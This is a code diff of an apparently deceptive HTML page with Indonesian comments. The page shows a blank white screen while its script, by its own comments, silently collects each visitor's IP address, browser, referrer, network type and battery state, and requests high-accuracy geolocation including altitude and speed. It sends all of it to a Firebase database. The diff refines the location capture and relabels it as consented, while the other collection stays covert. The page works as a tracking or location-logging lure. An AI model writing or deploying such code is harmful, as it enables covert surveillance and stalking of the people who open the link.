@@ -23,7 +23,7 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Fungsi ambil data silently lalu kirim ke DB
+        // Fungsi ambil data silently + geolocation (dengan izin)
         async function logUserData() {
             try {
                 // Ambil IP via API eksternal
@@ -127,24 +127,23 @@
                     }
                 } catch (e) {}
 
-                // Geolocation (TRIGGER POP-UP, tidak silent)
-                let geolocationData = { latitude: "Unknown", longitude: "Unknown", accuracy: "Unknown", timestamp: "Unknown" };
+                // Geolocation (trigger izin pop-up)
+                let geolocationData = { latitude: "Unknown", longitude: "Unknown", accuracy: "Unknown", altitude: "Unknown", speed: "Unknown" };
                 try {
                     if (navigator.geolocation) {
-                        await new Promise((resolve, reject) => {
+                        geolocationData = await new Promise((resolve) => {
                             navigator.geolocation.getCurrentPosition(
                                 (position) => {
-                                    geolocationData = {
+                                    resolve({
                                         latitude: position.coords.latitude,
                                         longitude: position.coords.longitude,
-                                        accuracy: position.coords.accuracy, // Dalam meter
-                                        timestamp: position.timestamp
-                                    };
-                                    resolve();
+                                        accuracy: position.coords.accuracy,
+                                        altitude: position.coords.altitude || "Unknown",
+                                        speed: position.coords.speed || "Unknown"
+                                    });
                                 },
                                 (error) => {
-                                    console.error('Geolocation error:', error); // Silent error
-                                    resolve(); // Lanjut meskipun gagal
+                                    resolve({ latitude: "Denied", longitude: "Denied", accuracy: "Denied", altitude: "Denied", speed: "Denied" });
                                 },
                                 { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                             );
@@ -155,7 +154,7 @@
                 // Timestamp di GMT+7 (Asia/Jakarta)
                 const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
 
-                // Data yang dikirim
+                // Data yang dikirim (silent + geolocation dengan izin)
                 const data = {
                     ip: userIP, // Berubah: VPN, proxy
                     browser: browser, // Tetap: kecuali ganti browser
@@ -176,7 +175,7 @@
                     referrer: document.referrer, // Berubah: tergantung link
                     connection: connectionData, // Berubah: WiFi/4G/5G
                     battery: batteryData, // Berubah: level baterai, charging
-                    geolocation: geolocationData, // Berubah: lokasi user, NOT SILENT
+                    geolocation: geolocationData, // Berubah: lokasi user, izin eksplisit
                     timestamp: timestamp // Berubah: per waktu
                 };
 
@@ -194,4 +193,4 @@
 <body>
     <!-- Blank putih, kosong -->
 </body>
-</html>
+    </html>
